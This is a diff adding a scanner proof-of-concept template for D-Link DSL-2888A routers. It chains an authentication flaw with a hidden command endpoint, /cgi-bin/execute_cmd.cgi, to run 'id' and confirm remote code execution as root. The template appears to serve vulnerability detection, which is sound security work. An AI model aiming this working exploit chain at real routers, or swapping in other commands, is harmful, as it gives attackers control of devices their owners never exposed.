@@ -1,0 +1,25 @@
+name: poc-yaml-dlink-dsl-2888a-rce
+rules:
+  - method: GET
+    path: /page/login/login.html
+    follow_redirects: false
+    expression: |
+      response.status == 200 && response.content_type.contains("text/html") && response.body.bcontains(b"var ModelName=\"DSL-2888A\";")
+  - method: POST
+    path: /
+    body: username=admin&password=6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    follow_redirects: false
+    expression: |
+      response.status == 302 && response.headers["location"] == "/page/login/login_fail.html"
+  - method: GET
+    path: /cgi-bin/execute_cmd.cgi?timestamp=1589333279490&cmd=id
+    follow_redirects: false
+    expression: |
+      response.status == 200 && response.content_type.contains("text/html") && response.body.bcontains(b"uid=0(admin) gid=0(admin)")
+detail:
+  author: mvhz81
+  info: dlink-dsl-2888a CVE-2020-24579(Insufficient Authentication) + Hidden Functionality (CVE-2020-24581) = RCE
+  links:
+    - https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/d-link-multiple-security-vulnerabilities-leading-to-rce/
